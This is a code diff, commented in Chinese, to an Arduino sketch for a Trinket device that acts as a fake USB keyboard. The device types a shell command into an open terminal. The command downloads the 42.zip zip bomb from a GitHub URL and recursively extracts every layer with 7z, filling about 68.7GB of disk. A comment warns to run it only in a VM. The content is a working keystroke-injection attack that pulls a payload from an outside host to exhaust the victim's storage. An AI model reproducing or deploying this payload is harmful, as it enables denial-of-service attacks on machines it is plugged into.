@@ -20,13 +20,15 @@ void loop() {
   TrinketHidCombo.pressKey(0, 0);  // 釋放按鍵
   delay(2000);  // 等待終端機啟動
 
-  // === 步驟 2：執行下載和解壓縮命令 ===
+  // === 步驟 2：下載並完整遞迴解壓（達到 68.7GB）===
   // 命令說明:
-  // - cd /tmp: 切換到暫存目錄 (重開機自動清除)
-  // - wget -q: 安靜模式下載 (-q 不顯示進度)
-  // - unzip -P 42: 使用密碼 42 解壓縮
-  TrinketHidCombo.print("cd /tmp && wget -q \"https://github.com/iamtraction/ZOD/raw/refs/heads/master/42.zip\" && unzip -P 42 42.zip");
-  delay(300);
+  // - wget: 下載 42.zip
+  // - 7z x: 解壓第一層
+  // - for i in 1 2 3 4: 遞迴解壓 4 層 (lib→book→paper→leaf)
+  // - find + 7z: 找到所有 zip 並解壓，然後刪除
+  // 警告: 這會產生 68.7GB 資料！確保在有足夠空間的VM中執行
+  TrinketHidCombo.print("cd /tmp && wget -q 'https://github.com/iamtraction/ZOD/raw/refs/heads/master/42.zip' && 7z x -p42 -y 42.zip && for i in 1 2 3 4; do find . -maxdepth 1 -name '*.zip' -type f -exec sh -c '7z x -p42 -y \"$1\" && rm \"$1\"' _ {} \\;; done");
+  delay(500);  // 增加延遲確保長命令完整傳送
 
   TrinketHidCombo.pressKey(0, KEYCODE_ENTER);
   delay(50);
